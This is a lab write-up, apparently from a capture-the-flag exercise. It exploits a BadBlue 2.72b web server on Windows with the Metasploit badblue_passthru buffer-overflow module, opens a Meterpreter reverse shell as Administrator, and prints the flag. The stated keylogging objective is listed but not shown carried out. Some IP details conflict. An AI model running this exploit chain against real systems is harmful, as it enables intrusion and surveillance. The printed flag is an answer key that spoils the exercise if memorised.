# Windows: File and Keylogging

## Mission

Metasploit is one of the most popular pentesting tools. With features such as migrating into other processes, keylogging, etc it makes windows exploitation particularly easy. 

In this lab exercise, you are provided with GUI access to the attacker machine and the windows target machine. This allows you to experience the perspective of both the attacker and the victim at the same time. 

Your task is to exploit the application using an appropriate Metasploit module and complete the below-mentioned objectives. 

###  Objective 

Retrieve the flag. 
Create a file on the desktop which contains the text "You have been Hacked"
From the Metasploit session, open the file in notepad on the target machine.
Use the keylogger to log the commands typed on the victim machine. 

### Instructions

Your Kali machine has an interface with IP address 10.10.X.Y. Run “ip addr” to know the values of X and Y.
The IP address of the target machine is mentioned in the file “/root/Desktop/target”
Do not attack the gateway located at IP address 192.V.W.1 and 10.10.X.1

## Notes

- **Target IP Address:** 10.4.25.43
- **eth1:** 10.10.0.5
- **eth0:** 10.1.1.5

## nmap (sudo nmap -vv -T4 -sC -sV 10.4.25.43)

    root@attackdefense:~# sudo nmap -vv -T4 -sC -sV 10.4.25.43

    Discovered open port 445/tcp on 10.4.25.43
    Discovered open port 3389/tcp on 10.4.25.43
    Discovered open port 139/tcp on 10.4.25.43
    Discovered open port 80/tcp on 10.4.25.43
    Discovered open port 135/tcp on 10.4.25.43
    Discovered open port 49153/tcp on 10.4.25.43
    Discovered open port 49152/tcp on 10.4.25.43
    Discovered open port 49155/tcp on 10.4.25.43
    Discovered open port 49163/tcp on 10.4.25.43
    Discovered open port 49154/tcp on 10.4.25.43

    PORT      STATE SERVICE            REASON          VERSION
    80/tcp    open  http               syn-ack ttl 125 BadBlue httpd 2.7
    | http-methods: 
    |_  Supported Methods: HEAD
    135/tcp   open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
    139/tcp   open  netbios-ssn        syn-ack ttl 125 Microsoft Windows netbios-ssn
    445/tcp   open  microsoft-ds       syn-ack ttl 125 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
    3389/tcp  open  ssl/ms-wbt-server? syn-ack ttl 125
    | ssl-cert: Subject: commonName=WIN-OMCNBKR66MN
    | Issuer: commonName=WIN-OMCNBKR66MN
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2022-04-04T02:28:05
    | Not valid after:  2022-10-04T02:28:05
    | MD5:   c858 07b1 79e9 0841 fbd1 dbd5 8262 1523
    | SHA-1: c7c0 939f 7fe9 cea5 e551 cf79 583f 1cd0 c42b 4058
    | -----BEGIN CERTIFICATE-----
    | MIIC4jCCAcqgAwIBAgIQOpmAovBY1IVMy6/cGIEBBjANBgkqhkiG9w0BAQsFADAa
    | MRgwFgYDVQQDEw9XSU4tT01DTkJLUjY2TU4wHhcNMjIwNDA0MDIyODA1WhcNMjIx
    | MDA0MDIyODA1WjAaMRgwFgYDVQQDEw9XSU4tT01DTkJLUjY2TU4wggEiMA0GCSqG
    | SIb3DQEBAQUAA4IBDwAwggEKAoIBAQDIjjxFZHu9dPAqaETsTehjezc/p5IgG6gZ
    | oqSPvQgSG73LzRNiuOv8jsvNk0w8h1+SDhED5TfaqO9dnGQIVNLeYSM4kNZXmf6c
    | H7ymKXoTekldJE7il84PRqRPVqC9EHAYVQhqldEaLR8lA8eFPNjEdk0g1z18esWB
    | sLHFEiDFo3tZ1roPxgb11H5WZwHLNmAnYYamtSSJcQuvgPBaJDiKtS1HTiWAKwkY
    | DPUOJaIt6zbLPl1abeuKBXaxfvTAWHORaVxvTUMJ3ZvYMySQvdwxO2aBLGMoCEDS
    | 3KPDjm1K56nhiGCJzubwXv0Rlbg4O7IonUdi7goocSC2njB3WRSVAgMBAAGjJDAi
    | MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF
    | AAOCAQEAaNUwB01WK2B1msmM6aefTNKJJhnWAkgtDsS9fPun3YgjjSDNnLadwhNp
    | tC6r9jjcKXxYLRBq//+emhnUyJU7VWxBs8Qek1//Y93qDRZ87XEq7syvQ+4+YmY3
    | 7vRNaTduxjgCHsu+BHbOlVunBWMuZMaUxwjZT5Rbr1+Dddl2rYo5uPuUT+cJYO5o
    | APJDUdSVbkdac1LK1wcNaGza6z66uxsZnChfKS00x9ZGJmrQpfcFcjtXwqh5+fxC
    | FrcZa3ROay+1NCUx7l115LmfFTGYQfEpZINFCA+xhE1jgsa/bIe9sx10nVUMPv8C
    | NpMynCDXnf81HYws8hZ/xb3Dwm1d+g==
    |_-----END CERTIFICATE-----
    49152/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
    49153/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
    49154/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
    49155/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
    49163/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
    Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

    Host script results:
    |_clock-skew: mean: 0s, deviation: 0s, median: -1s
    | p2p-conficker: 
    |   Checking for Conficker.C or higher...
    |   Check 1 (port 57942/tcp): CLEAN (Couldn't connect)
    |   Check 2 (port 38907/tcp): CLEAN (Couldn't connect)
    |   Check 3 (port 49156/udp): CLEAN (Timeout)
    |   Check 4 (port 44728/udp): CLEAN (Failed to receive data)
    |_  0/4 checks are positive: Host is CLEAN or ports are blocked
    | smb-security-mode: 
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    | smb2-security-mode: 
    |   2.02: 
    |_    Message signing enabled but not required
    | smb2-time: 
    |   date: 2022-04-05 08:05:43
    |_  start_date: 2022-04-05 07:57:59


## MSFCONSOLE windows/http/badblue_passthru

    msf5 exploit(windows/http/badblue_passthru) > info

        Name: BadBlue 2.72b PassThru Buffer Overflow
        Module: exploit/windows/http/badblue_passthru
    Platform: Windows
        Arch: 
    Privileged: Yes
        License: Metasploit Framework License (BSD)
        Rank: Great
    Disclosed: 2007-12-10

    Provided by:
    MC <mc@metasploit.com>

    Available targets:
    Id  Name
    --  ----
    0   BadBlue EE 2.7 Universal
    1   BadBlue 2.72b Universal

    Check supported:
    No

    Basic options:
    Name     Current Setting  Required  Description
    ----     ---------------  --------  -----------
    Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
    RHOSTS   10.4.19.179      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
    RPORT    80               yes       The target port (TCP)
    SSL      false            no        Negotiate SSL/TLS for outgoing connections
    VHOST                     no        HTTP server virtual host

    Payload information:
    Space: 750
    Avoid: 15 characters

    Description:
    This module exploits a stack buffer overflow in the PassThru 
    functionality in ext.dll in BadBlue 2.72b and earlier.

    References:
    https://cvedetails.com/cve/CVE-2007-6377/
    OSVDB (42416)
    http://www.securityfocus.com/bid/26803

## MSFCONSOLE Exploit

    msf5 exploit(windows/http/badblue_passthru) > exploit

    [*] Started reverse TCP handler on 10.4.25.43:4444 
    [*] Trying target BadBlue EE 2.7 Universal...
    [*] Sending stage (180291 bytes) to 10.4.19.179
    [*] Meterpreter session 1 opened (10.4.25.43:4444 -> 10.4.19.179:49240) at 2022-04-05 07:47:22 +0530

    meterpreter > getuid
    Server username: Server username: WIN-OMCNBKR66MN\Administrator

## Treasure

    meterpreter > cd /
    meterpreter > dir
    Listing: C:\
    ============

    Mode                 Size                Type  Last modified                    Name
    ----                 ----                ----  -------------                    ----
    40777/rwxrwxrwx      0                   dir   2020-08-12 09:43:47 +0530        $Recycle.Bin
    100666/rw-rw-rw-     1                   fil   2013-08-22 21:16:48 +0530        BOOTNXT
    40777/rwxrwxrwx      0                   dir   2013-08-22 20:18:41 +0530        Documents and Settings
    40777/rwxrwxrwx      0                   dir   2013-08-22 21:09:30 +0530        PerfLogs
    40555/r-xr-xr-x      4096                dir   2013-08-22 19:06:16 +0530        Program Files
    40777/rwxrwxrwx      4096                dir   2013-08-22 19:06:16 +0530        Program Files (x86)
    40777/rwxrwxrwx      4096                dir   2013-08-22 19:06:16 +0530        ProgramData
    40777/rwxrwxrwx      0                   dir   2020-09-05 09:16:25 +0530        System Volume Information
    40555/r-xr-xr-x      4096                dir   2013-08-22 19:06:16 +0530        Users
    40777/rwxrwxrwx      24576               dir   2013-08-22 19:06:16 +0530        Windows
    100444/r--r--r--     398356              fil   2013-08-22 21:16:48 +0530        bootmgr
    100666/rw-rw-rw-     32                  fil   2020-09-16 14:31:09 +0530        flag.txt
    402211620/rw--w----  300329934679736303  fif   9526081072-11-03 07:52:56 +0530  pagefile.sys

    meterpreter > cat flag.txt
    70a569da306697d64fc6c19afea37d94
    